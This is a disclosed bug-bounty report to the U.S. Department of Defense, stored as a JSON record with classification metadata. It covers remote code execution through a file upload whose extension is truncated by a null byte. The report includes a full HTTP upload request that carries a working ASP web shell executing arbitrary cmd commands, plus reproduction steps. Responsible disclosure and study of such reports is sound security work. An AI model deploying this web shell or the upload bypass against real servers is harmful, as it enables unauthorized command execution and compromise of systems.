{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "pizzapower ",
  "title": "RCE via File Upload  with a Null Byte Truncated File Extension at https://\u2588\u2588\u2588\u2588\u2588\u2588/",
  "content": "\nHi,\nI found \"repos\" at https://\u2588\u2588\u2588/ and https://c\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/ and this one (which doesn't have the file upload functionality appearing on the DOM, but it still may be there) https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588. There may be more, I had to fuzz a lot to find these.\nThese repos contain file upload functionality. I found that if you place a null byte between file extensions, you can upload files with malicious extensions.\nRunning the dir command at the uploaded file https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/savefiles/poc.asp?cmd=dir - the shell has been deleted for security purposes. Let me know if you want me to reupload it.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nThe request from burp - note the null byte:\n\u2588\u2588\u2588\u2588\u2588\nReproduction\nNavigate to https://\u2588\u2588\u2588/\nSubmit a file upload the same as the request I made above. Make sure there is a null byte between asp and png.\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/savefiles/poc.asp and run commands.\nImpact\nEverything could be compromised.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nHere is the actual request, but I'm not sure how well the null byte will translate.\nCode 1.87 KiB\n1POST /repo/orbital/repo.asp?fileToUpload=pizza.asp HTTP/1.1\n2Host: \u2588\u2588\u2588\n3Cookie: ASPSESSIONIDCCSBDDQT=CAJLLPMCPOBLODENMGDGMADC\n4Content-Length: 1306\n5Sec-Ch-Ua: \n6Accept: */*\n7Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7RcvHwqSCmAtKCIB\n8X-Requested-With: XMLHttpRequest\n9Sec-Ch-Ua-Mobile: ?0\n10User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36\n11Sec-Ch-Ua-Platform: \"\"\n12Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n13Sec-Fetch-Site: same-origin\n14Sec-Fetch-Mode: cors\n15Sec-Fetch-Dest: empty\n16Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\n17Accept-Encoding: gzip, deflate\n18Accept-Language: en-US,en;q=0.9\n19Connection: close\n20\n21------WebKitFormBoundary7RcvHwqSCmAtKCIB\n22Content-Disposition: form-data; name=\"myfile\"; filename=\"poc.asp.png\"\n23\n24\n25<%\n26Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\n27Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\n28Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\n29Function getCommandOutput(theCommand)\n30    Dim objShell, objCmdExec\n31    Set objShell = CreateObject(\"WScript.Shell\")\n32    Set objCmdExec = objshell.exec(thecommand)\n33    getCommandOutput = objCmdExec.StdOut.ReadAll\n34end Function\n35%>\n36\n37\n38<HTML>\n39<BODY>\n40<FORM action=\"\" method=\"GET\">\n41<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">\n42<input type=\"submit\" value=\"Run\">\n43</FORM>\n44<PRE>\n45<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>\n46<%Response.Write(Request.ServerVariables(\"server_name\"))%>\n47<p>\n48<b>The server's port:</b>\n49<%Response.Write(Request.ServerVariables(\"server_port\"))%>\n50</p>\n51<p>\n52<b>The server's software:</b>\n53<%Response.Write(Request.ServerVariables(\"server_software\"))%>\n54</p>\n55<p>\n56<b>The server's local address:</b>\n57<%Response.Write(Request.ServerVariables(\"LOCAL_ADDR\"))%>\n58<% szCMD = request(\"cmd\")\n59thisDir = getCommandOutput(\"cmd /c\" & szCMD)\n60Response.Write(thisDir)%>\n61</p>\n62<br>\n63</BODY>\n64</HTML>\n65\n66\n67\n68------WebKitFormBoundary7RcvHwqSCmAtKCIB--\n69\nReproduction\nNavigate to https://\u2588\u2588\u2588/\nSubmit a file upload the same as the request I made above. Make sure there is a null byte between asp and png.\nVisit https://\u2588\u2588\u2588\u2588/savefiles/poc.asp and run commands.\nSuggested Mitigation/Remediation Actions\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1703198400,
  "report_url": "https://hackerone.com/reports/2054184",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to the target website and locate the file upload functionality."
    ],
    [
      2,
      "Upload a file with a malicious extension (e.g., .asp) followed by a null byte and a benign extension (e.g., .png). The server may truncate the extension at the null byte, allowing the malicious file to be executed."
    ]
  ],
  "vuln_description": "This vulnerability allows an attacker to upload a malicious file (e.g., a web shell) by exploiting a null byte truncation in the file extension. The server processes the file as having the malicious extension (e.g., .asp) instead of the benign one (e.g., .png), leading to remote code execution (RCE).",
  "reason": "The attack involves understanding how null byte truncation can bypass file extension checks, which is a known but non-obvious technique. The tester also had to fuzz multiple endpoints to discover the vulnerable functionality, adding to the complexity.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves file upload functionality with a null byte truncation, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions or resource IDs, not file upload vulnerabilities.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves exploiting a null byte truncation in a file upload parameter to bypass extension validation. The methodology identifies injectable parameters (e.g., the filename in the upload request) and tests them with simple payloads. However, the null byte injection is a specific filter bypass technique that may not be included in a 'simple' payload list (which focuses on generic payloads like base64 encoding). Additionally, the RCE impact requires executing the uploaded file, which depends on server-side handling and is not detectable through the same HTTP response channel (e.g., stored XSS would require regular navigation to the trigger site, but RCE execution is not directly observable via the same channel). Thus, while the parameter is injectable, the payload and detection mechanism exceed the methodology's scope.",
    "is_simple_injection": false
  }
}